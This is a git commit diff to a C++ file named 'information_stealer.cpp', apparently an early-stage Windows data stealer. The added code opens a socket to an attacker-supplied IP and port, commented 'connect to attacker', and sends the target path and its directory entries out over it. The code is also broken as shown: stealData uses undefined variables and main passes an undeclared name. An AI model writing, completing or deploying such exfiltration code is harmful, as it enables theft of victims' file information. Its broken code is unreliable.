60276389e107a4101b408015edbe29d27f6ce5f9
Hazem <hazemkya@gmail.com>
2022-03-30 19:58:06 +0300

    '.'

--- information_stealer.cpp
+++ information_stealer.cpp
@@ -2,17 +2,49 @@
 #define _CRT_SECURE_NO_WARNINGS
 
 #pragma comment(lib, "Ws2_32.lib")
+
 #include <iostream>
 #include <WinSock2.h>
 #include <stdio.h>
 #include <stdlib.h>
+#include <dirent.h>
+#include <string>
 
 using namespace std;
-const char lhost[] = "";
-int main()
+
+int stealData(char *fileName)
 {
+    DIR *dir;
+    struct dirent *ent;
+    if ((dir = opendir(filePath)) != NULL)
+    {
+        while ((ent = readdir(dir)) != NULL)
+        {
+            send(Socket, ent->d_name, sizeof(ent->d_name), 0);
+            send(Socket, "\n", 1, 0);
+            memset(ent->d_name, 0, sizeof(ent->d_name));
+        }
+        closedir(dir);
+        return 1;
+    }
+    else
+    {
+        perror("Can't open the file.");
+        return 0;
+    }
+}
+
+int main(int argc, char *args[])
+{
+
+    // Vars
+    char *ip = args[1];
+    int port = atoi(args[2]);
+    char *filePath = args[3];
+
     // winsock init
     WSADATA wsaData;
+    SOCKADDR_IN addr;
     WORD DLLversion = MAKEWORD(2, 1);
     if (WSAStartup(DLLversion, &wsaData) != 0)
     {
@@ -21,25 +53,26 @@ int main()
     }
 
     // Create Socket
-
-    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
-    if (sock < 0)
+    SOCKET Socket = socket(AF_INET, SOCK_STREAM, 0);
+    if (Socket < 0)
     {
         printf("Erorr, can't continue.");
+        ExitProcess(EXIT_FAILURE);
     }
+    // Bind the socket
+    addr.sin_addr.s_addr = inet_addr(ip);
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(port);
 
     // connect to attacker
-    HOSTENT *host = gethostbyname(lhost);
-    if (host == nullptr)
-        ExitProcess(EXIT_FAILURE);
-    // take action
 
-    // action 1: send file with (name)
+    connect(Socket, (SOCKADDR *)&addr, sizeof(addr));
+
+    // take action
+    send(Socket, filePath, sizeof(filePath), 0);
+    send(Socket, "\n", 1, 0);
+
+    stealData(fileName);
 
     ExitProcess(EXIT_SUCCESS);
-}
-
-void getFile(string path)
-{
-    return;
 }
